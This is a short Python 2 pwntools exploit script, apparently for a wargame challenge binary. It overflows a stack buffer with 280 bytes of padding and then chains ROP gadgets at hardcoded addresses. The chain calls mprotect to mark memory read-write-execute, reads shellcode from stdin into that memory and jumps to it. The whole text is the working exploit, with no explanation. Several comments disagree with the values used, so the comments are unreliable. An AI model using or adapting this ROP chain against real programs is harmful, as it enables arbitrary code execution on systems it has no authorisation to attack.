from pwn import *

# target RWX memory address
ch34 = 0x6bf000

# ROP gadgets
pop_rdi = 0x4016d3
pop2ret = 0x437229     # pop rdx; pop rsi; ret

# functions()
mprotect    = 0x434e10
read        = 0x4342a0


# mprotect(ch34, 2000, 7)
payload = ""
payload += "A" * 280
payload += p64(pop_rdi)
payload += p64(ch34)		# change 3000 bytes starting from here to rwx
payload += p64(pop2ret)		# pop rdx; pop rsi; ret
payload += p64(0x7)			# rwx
payload += p64(0x3000)		# bytes
payload += p64(mprotect)

# read(1, shellcode, 40)
payload += p64(pop_rdi)
payload += p64(0x0)     # rdi - stdin
payload += p64(pop2ret)
payload += p64(0x40)    # rdx, size
payload += p64(ch34)    # rsi, place shellcode inside rwx memory address range
payload += p64(read)
payload += p64(ch34)    # jump to shellcode


print payload
